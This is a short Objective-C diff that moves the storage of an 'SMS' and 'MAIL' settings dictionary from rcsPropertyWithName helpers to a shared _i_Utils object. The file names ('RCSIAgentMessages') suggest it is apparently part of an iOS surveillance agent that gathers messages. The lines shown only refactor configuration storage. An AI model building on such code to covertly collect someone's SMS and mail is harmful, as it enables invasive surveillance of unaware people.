@@ -12,6 +12,8 @@
 #import <objc/runtime.h>
 
 #import "RCSIAgentMessages.h"
+#import "RCSIUtils.h"
+
 #ifdef __APPLE__
 #include "TargetConditionals.h"
 #endif
@@ -180,12 +182,14 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   NSDictionary *smsDict     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsArray, mailArray, nil] 
                                                             forKeys: [NSArray arrayWithObjects: @"SMS", @"MAIL", nil]];
   
-  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsDict, nil]
-                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
+//  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsDict, nil]
+//                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
   
-  setRcsPropertyWithName([[self class] description], agentDict);
+  //setRcsPropertyWithName([[self class] description], agentDict);
+  [[_i_Utils sharedInstance] setPropertyWithName:[[self class] description]
+                                  withDictionary:smsDict];
   
-  [agentDict release];
+//  [agentDict release];
   [smsDict release];
   [smsReal release];
   [smsCllt release];
@@ -210,7 +214,8 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  agentDict = rcsPropertyWithName([[self class] description]);
+  //agentDict = rcsPropertyWithName([[self class] description]);
+  agentDict = [[_i_Utils sharedInstance] getPropertyWithName:[[self class] description]];
   
   if (agentDict == nil) 
     {
